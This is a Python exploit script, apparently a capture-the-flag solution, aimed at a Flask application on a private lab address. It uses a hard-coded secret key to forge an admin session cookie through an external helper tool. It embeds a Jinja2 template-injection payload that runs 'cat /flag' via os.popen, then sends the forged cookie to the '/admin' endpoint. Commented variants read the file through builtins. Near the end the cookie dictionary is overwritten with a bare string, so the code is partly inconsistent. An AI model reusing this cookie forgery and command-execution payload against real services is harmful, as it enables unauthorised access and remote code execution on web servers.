import subprocess

import requests
import html

# 目标URL
url = 'http://10.12.153.8:32541//admin'

# 自定义头部信息
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache'
}

# 设置Cookie
cookies = {
    'session': 'eyJyb2xlIjp7ImlzX2FkbWluIjoxLCJuYW1lIjoidGVzdCIsInNlY3JldF9rZXkiOiJWR2d4YzBCdmJtVWhjMlZEY21WMElRPT0ifX0.Zm5hhA.AeBCunI1LfN60mIKn3rLiEQkNDE'
}

# 子脚本的路径
script_path = r"D:/Coding Practice/CTF/flask-session-cookie-manager/flask_session_cookie_manager3.py"

# 指定Python解释器的路径
python_interpreter = r"D:/Coding Practice/CTF/flask-session-cookie-manager/venv/Scripts/python.exe"

# 传递给子脚本的参数
cmd = "{{get_flashed_messages.__globals__.get('os').popen('cat /flag ').read()}}"
# cmd = '{{9*9}}'
# cmd = {{
# get_flashed_messages.__globals__.__builtins__.open('/flag').read()
# }}
str1 = '{"role":"{\"is_admin\":1,"name\":\"test\",\"flag\":\"' + cmd + '\"}}'
print(str1)

# str1 = '{"role":"{\"is_admin\":1,"name\":\"test\",\"secret_key\":\"VGgxOBvbmUhC2VDcmVOIQ==\"}}'
args = ['encode', '-s', 'Th1s@one!seCret!', '-t', str1]

# 使用subprocess运行子脚本，并指定解释器路径
result = subprocess.run([python_interpreter, script_path] + args, capture_output=True, text=True)

# 检查子脚本的返回状态
if result.returncode == 0:
    print(result.stdout.strip())
    cookies['session'] = result.stdout.strip()
else:
    print("Error executing the script:", result.stderr)

cookies = '.eJw1i7EOgjAURX-leQuQIKIxDiQsxsQ4urA2j_KsxJaStqCm6b9bB-94zrkBrFEETYDRcRz0OEGzK2FCnSDgf1CCI2HJsyd9kugu8i3q09rr5SH261nojq63tk3dXaFMRQhqnN2iK86lMj0qx3klyeeZcVlRzWamKc8Eerb9PVSPjo4HtnmxOmlLOORFjBDjFx8yNYk.ZxY_bg.G4tTEsAzOJ_nQcOykAYMyWy2d-4'
# 发送POST请求
response = requests.get(url, headers=headers,cookies=cookies)
# print(headers)
# 打印响应内容
print(response.status_code)
print(html.unescape(response.text))

